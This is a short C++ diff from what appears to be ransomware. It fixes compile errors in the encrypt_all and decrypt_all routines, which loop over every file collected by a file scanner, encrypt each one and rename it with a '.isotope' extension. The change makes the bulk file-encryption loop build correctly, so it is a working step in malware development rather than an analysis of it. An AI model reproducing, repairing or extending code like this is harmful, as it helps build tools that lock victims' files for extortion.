@@ -68,7 +68,7 @@ void c_crypto::encrypt_all()
 	for (int i = 0; i < c_filescan::files.size(); i++)
 	{
 		std::string new_file = c_filescan::files[i].u8string() + ".isotope";
-		c_crypto::encrypt_file(c_filescan::files[i].u8string, (char*)new_file.c_str());
+		c_crypto::encrypt_file((char*)c_filescan::files[i].u8string().c_str(), (char*)new_file.c_str());
 	}
 }
 
@@ -77,6 +77,6 @@ void c_crypto::decrypt_all()
 	for (int i = 0; i < c_filescan::files.size(); i++)
 	{
 		std::string old_file = c_filescan::files[i].u8string() + ".isotope";
-		c_crypto::decrypt_file((char*)old_file.c_str(), c_filescan::files[i].u8string);
+		c_crypto::decrypt_file((char*)old_file.c_str(), (char*)c_filescan::files[i].u8string().c_str());
 	}
 }
